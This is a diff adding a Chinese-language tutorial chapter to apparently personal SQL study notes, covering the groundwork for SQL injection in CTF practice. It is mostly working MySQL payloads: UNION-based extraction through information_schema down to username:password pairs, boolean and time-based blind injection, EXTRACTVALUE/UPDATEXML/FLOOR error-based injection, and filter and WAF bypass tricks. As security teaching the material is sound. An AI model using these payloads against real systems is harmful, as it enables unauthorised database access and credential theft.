@@ -322,7 +322,342 @@ SELECT name, COALESCE(score, backup_score, 0) AS final FROM students;
 | UPDATE/DELETE | 永远先想 WHERE，先 SELECT 验证再动手 |
 | NULL | 用 IS NULL 判断，IFNULL/COALESCE 兜底 |
 
+---
+
+## 九、SQL 注入前置知识
+
+> 本节集中讲解 SQL 注入所需但前八节未覆盖的知识点。学完本节即可衔接 [[../../red_team/ctf_trea/Web/SQL/01-整数型注入|整数型注入]] 章节，进入实战。
+
+### 9.1 注释符
+
+SQL 注释符在注入中用于**截断原始语句的后半部分**，使注入的 payload 能正常执行。
+
+| 注释符 | 写法 | 注意事项 |
+|--------|------|----------|
+| `--` (双横杠) | `1' -- ` | 后面**必须有空格**（或换行），否则不生效 |
+| `#` | `1' #` | URL 中需要编码为 `%23` |
+| `/* */` | `1'/*anything*/` | 多行注释，可插入任意内容绕过 WAF |
+
+```sql
+-- 原始语句
+SELECT * FROM users WHERE id = '用户输入';
+
+-- 注入示例：用 -- 截断后面的引号
+输入: 1' OR '1'='1' -- 
+执行: SELECT * FROM users WHERE id = '1' OR '1'='1' -- ';
+
+-- 注入示例：用 # 截断
+输入: 1' OR '1'='1' #
+执行: SELECT * FROM users WHERE id = '1' OR '1'='1' #';
+
+-- 用 /**/ 注入（绕过空格过滤）
+输入: 1'/**/OR/**/'1'='1
+执行: SELECT * FROM users WHERE id = '1'/**/OR/**/'1'='1';
+```
+
+> 关键理解：注释符的作用是让数据库**忽略注入点之后的原始代码**，这样你写的 payload 就能完整执行。
+
+### 9.2 UNION 联合查询
+
+UNION 是 SQL 注入中最常用的数据提取方式。它将两个 SELECT 的结果合并为一个结果集。
+
+**核心规则：**
+1. 两个 SELECT 的**列数必须相同**
+2. 对应列的**数据类型兼容**（通常用 NULL 占位）
+3. UNION 只能放在最后一个 SELECT 之后
+
+**注入三步法：**
+
+```sql
+-- 第一步：确定列数（ORDER BY N 逐步增大直到报错）
+?id=1 ORDER BY 3    -- 正常 → 至少 3 列
+?id=1 ORDER BY 4    -- 报错 → 总共 3 列
+
+-- 第二步：确定显示位（哪些列的数据会显示在页面上）
+?id=-1 UNION SELECT 1,2,3
+-- id=-1 不存在，主查询返回空，页面只显示 UNION 的结果
+-- 页面上出现的数字就是"显示位"，后续把数字替换成要提取的数据
+
+-- 第三步：提取数据（替换显示位为子查询）
+?id=-1 UNION SELECT 1,database(),3          -- 当前数据库名
+?id=-1 UNION SELECT 1,version(),3           -- MySQL 版本
+?id=-1 UNION SELECT 1,user(),3              -- 当前用户
+?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()  -- 所有表名
+?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'       -- 所有列名
+?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users  -- 提取数据
+```
+
+> `-1` 的作用：让主查询返回空结果，这样 UNION 的结果独占显示位。也可以用 `AND 1=2` 等恒假条件代替。
+
+### 9.3 information_schema 元数据库
+
+MySQL 有一个**自动维护**的特殊数据库 `information_schema`，存储了所有数据库、表、列的元信息。SQL 注入中提取数据的核心就是查询它。
+
+```
+information_schema
+├── schemata          → 所有数据库名
+│   └── schema_name   → 数据库名
+├── tables            → 所有表名
+│   ├── table_schema  → 所属数据库名
+│   └── table_name    → 表名
+└── columns           → 所有列名
+    ├── table_schema  → 所属数据库名
+    ├── table_name    → 所属表名
+    └── column_name   → 列名
+```
+
+**注入中的标准查询链：**
+
+```sql
+-- 1. 爆数据库名
+SELECT schema_name FROM information_schema.schemata;
+
+-- 2. 爆指定数据库的表名
+SELECT table_name FROM information_schema.tables
+WHERE table_schema = '目标库名';
+
+-- 3. 爆指定表的列名
+SELECT column_name FROM information_schema.columns
+WHERE table_name = '目标表名';
+
+-- 4. 提取数据
+SELECT 列1,列2 FROM 目标库名.目标表名;
+```
+
+**对应注入 payload：**
+
+```sql
+-- 爆库名
+?id=-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata
+
+-- 爆表名（把 security 换成目标库名）
+?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='security'
+
+-- 爆列名（把 users 换成目标表名）
+?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'
+
+-- 提取数据
+?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users
+```
+
+> `0x3a` 是冒号 `:` 的十六进制，用于分隔用户名和密码。`group_concat()` 把多行合并为一行逗号分隔的字符串。
+
+### 9.4 GROUP_CONCAT 与 CONCAT
+
+在注入中，页面通常只有一个显示位，但需要提取多行数据。`GROUP_CONCAT` 把多行合并为一行。
+
+| 函数 | 作用 | 示例 |
+|------|------|------|
+| `CONCAT(a,b,c)` | 拼接多个值 | `CONCAT('a','b')` → `'ab'` |
+| `CONCAT_WS(sep,a,b)` | 用分隔符拼接 | `CONCAT_WS(':','a','b')` → `'a:b'` |
+| `GROUP_CONCAT(col)` | 合并多行为一行 | `GROUP_CONCAT(name)` → `'Alice,Bob,Carol'` |
+| `GROUP_CONCAT(col SEPARATOR '分隔符')` | 指定分隔符 | `GROUP_CONCAT(name SEPARATOR ':')` → `'Alice:Bob:Carol'` |
+
+```sql
+-- 普通 CONCAT：拼接单行的多个字段
+?id=-1 UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users WHERE id=1
+
+-- GROUP_CONCAT：把多行数据合并到一个显示位
+?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users
+-- 结果: "admin:123456,alice:pass1,bob:pass2"
+
+-- 带排序
+?id=-1 UNION SELECT 1,group_concat(username,0x3a,password ORDER BY username),3 FROM users
+```
+
+### 9.5 ORDER BY 列数探测
+
+`ORDER BY N` 按第 N 列排序。当 N 超过实际列数时会报错，因此可以用来探测 SELECT 的列数。
+
+```sql
+-- 逐步增大 N，找到报错的临界值
+?id=1 ORDER BY 1    -- 正常
+?id=1 ORDER BY 2    -- 正常
+?id=1 ORDER BY 3    -- 正常
+?id=1 ORDER BY 4    -- 报错：Unknown column '4' in 'order clause'
+→ 结论：当前 SELECT 有 3 列
+```
+
+**ORDER BY 注入（当 ORDER BY 参数可控时）：**
+
+```sql
+-- 报错法：用 IF 构造条件
+ORDER BY IF(1=1, (SELECT COUNT(*) FROM information_schema.tables), 1)
+-- 真条件 → 执行子查询 → 可能触发报错带出信息
+
+-- 时间法：用 SLEEP 判断条件真假
+ORDER BY IF(ASCII(SUBSTRING(database(),1,1))>100, SLEEP(3), 1)
+-- 如果第一个字符 ASCII > 100，响应延迟 3 秒
+```
+
+### 9.6 盲注函数
+
+当页面**不显示数据也不显示报错**时，需要逐字符猜解数据。以下函数是盲注的核心工具。
+
+**字符串截取与比较：**
+
+| 函数 | 作用 | 示例 |
+|------|------|------|
+| `LENGTH(str)` | 字符串长度 | `LENGTH('admin')` → `5` |
+| `SUBSTRING(str,pos,len)` | 截取子串 | `SUBSTRING('admin',1,1)` → `'a'` |
+| `SUBSTR()` | 同 SUBSTRING | 别名 |
+| `LEFT(str,len)` | 取左边 N 个字符 | `LEFT('admin',3)` → `'adm'` |
+| `ASCII(str)` | 返回字符的 ASCII 码 | `ASCII('a')` → `97` |
+| `ORD(str)` | 同 ASCII | 别名 |
+
+**布尔盲注猜解库名长度：**
+
+```sql
+-- 猜解数据库名长度
+?id=1 AND LENGTH(database())=8    -- 页面正常 → 长度是 8
+?id=1 AND LENGTH(database())=7    -- 页面异常 → 长度不是 7
+
+-- 逐字符猜解数据库名
+?id=1 AND ASCII(SUBSTRING(database(),1,1))=115   -- 第1个字符 ASCII=115 → 's'
+?id=1 AND ASCII(SUBSTRING(database(),2,1))=101   -- 第2个字符 ASCII=101 → 'e'
+?id=1 AND ASCII(SUBSTRING(database(),3,1))=99    -- 第3个字符 ASCII=99  → 'c'
+-- 完整库名: security
+```
+
+**时间盲注（SLEEP / BENCHMARK）：**
+
+| 函数 | 作用 | 示例 |
+|------|------|------|
+| `SLEEP(N)` | 暂停 N 秒 | `SLEEP(5)` → 响应延迟 5 秒 |
+| `BENCHMARK(N,expr)` | 执行表达式 N 次 | `BENCHMARK(10000000,SHA1('test'))` → CPU 密集型延迟 |
+
+```sql
+-- 时间盲注：根据响应延迟判断条件真假
+?id=1 AND IF(ASCII(SUBSTRING(database(),1,1))>100, SLEEP(3), 0)
+-- 响应延迟 3 秒 → 条件为真
+-- 响应无延迟 → 条件为假
+
+-- BENCHMARK 替代 SLEEP（当 SLEEP 被过滤时）
+?id=1 AND IF(ASCII(SUBSTRING(database(),1,1))>100, BENCHMARK(10000000,SHA1('a')), 0)
+```
+
+### 9.7 报错注入函数
+
+当页面**会显示数据库报错信息**时，可以把查询结果塞进报错信息中回显。三大报错函数：
+
+**① EXTRACTVALUE（XPath 报错）：**
+
+```sql
+-- 语法：EXTRACTVALUE(XML_frag, XPath_expr)
+-- 当 XPath 语法错误时，MySQL 会把错误信息返回
+
+?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))
+-- 报错信息: XPATH syntax error: '~security~'
+-- 0x7e 是波浪号 ~，用于定位数据（非语法字符，会触发报错）
+
+-- 逐字符提取（配合 SUBSTRING）
+?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 10), 0x7e))
+```
+
+**② UPDATEXML（XPath 报错）：**
+
+```sql
+-- 语法：UPDATEXML(XML_frag, XPath_expr, new_value)
+-- 与 EXTRACTVALUE 原理相同，XPath 语法错误时返回错误信息
+
+?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)
+-- 报错信息: XPATH syntax error: '~root@localhost~'
+```
+
+> EXTRACTVALUE 和 UPDATEXML 的区别：EXTRACTVALUE 返回第二个参数的值，UPDATEXML 返回第三个参数。但两者都因为第二个参数（XPath）的格式错误而报错，利用的是报错信息本身。
+
+**③ FLOOR + RAND（主键冲突报错）：**
+
+```sql
+-- 原理：RAND() 生成随机数，GROUP BY 统计时触发主键冲突报错
+-- 报错信息中包含分组的值（即我们要提取的数据）
+
+?id=1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x7e, FLOOR(RAND(0)*2)) FROM information_schema.tables GROUP BY x)a)
+-- 报错信息: Duplicate entry 'security~1' for key 'group_key'
+-- security 就是数据库名
+```
+
+> FLOOR+RAND 是最早的报错注入手法，现在用得较少（需要特定条件触发）。优先使用 EXTRACTVALUE/UPDATEXML。
+
+### 9.8 十六进制编码
+
+MySQL 中可以用 `0x` 前缀表示十六进制字符串，注入中常用于**绕过引号过滤**。
+
+```sql
+-- 常规写法（需要引号）
+WHERE table_schema = 'security'
+
+-- 十六进制写法（不需要引号）
+WHERE table_schema = 0x7365637572697479
+-- 0x7365637572697479 = 'security' 的十六进制
+
+-- 生成十六进制的方法
+SELECT HEX('security');           -- 7365637572697479
+SELECT CONCAT('0x', HEX('users')); -- 0x7573657273
+```
+
+**注入中使用：**
+
+```sql
+-- 当单引号被过滤时，用十六进制代替表名/库名
+?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=0x7365637572697479
+
+-- 等价于
+?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='security'
+```
+
+### 9.9 常用编码与转义
+
+| 编码 | 用途 | 示例 |
+|------|------|------|
+| 十六进制 `0x` | 绕过引号 | `0x61646D696E` = `'admin'` |
+| URL 编码 | 注释符 `#` 需编码为 `%23` | `1'%23` |
+| 双写绕过 | 关键字被过滤时 | `ununionion` → `union` |
+| 大小写混合 | 关键字过滤 | `UnIoN` `SeLeCt` |
+| 内联注释 | 绕过 WAF | `/*!UNION*/ SELECT` |
+
+### 9.10 速查：从注入到数据的完整流程
+
+```
+1. 确定注入类型
+   ?id=1 AND 1=1  → 正常
+   ?id=1 AND 1=2  → 异常
+   → 差异 → 注入成立
+
+2. 确定列数
+   ?id=1 ORDER BY N → 逐步增大直到报错
+
+3. 确定显示位
+   ?id=-1 UNION SELECT 1,2,3,...
+   → 页面上出现的数字就是显示位
+
+4. 替换显示位为数据
+   库名:  ?id=-1 UNION SELECT 1,database(),3
+   版本:  ?id=-1 UNION SELECT 1,version(),3
+
+5. 通过 information_schema 爆表名
+   ?id=-1 UNION SELECT 1,group_concat(table_name),3
+   FROM information_schema.tables WHERE table_schema='库名'
+
+6. 爆列名
+   ?id=-1 UNION SELECT 1,group_concat(column_name),3
+   FROM information_schema.columns WHERE table_name='表名'
+
+7. 提取数据
+   ?id=-1 UNION SELECT 1,group_concat(列1,0x3a,列2),3 FROM 表名
+```
+
+**无回显时的备选方案：**
+
+```
+有报错信息 → 报错注入（EXTRACTVALUE / UPDATEXML）
+有页面差异 → 布尔盲注（ASCII + SUBSTRING + 条件判断）
+无任何差异 → 时间盲注（SLEEP / BENCHMARK + IF）
+```
+
 下一章把查询能力拉满：[[03-查询进阶|查询进阶]]
+
+SQL 注入实战：[[../../red_team/ctf_trea/Web/SQL/01-整数型注入|整数型注入]] → [[../../red_team/ctf_trea/Web/SQL/SQL总目录|SQL 注入总目录]]
 
 ---
 **返回** [[../数据库目录|数据库目录]]
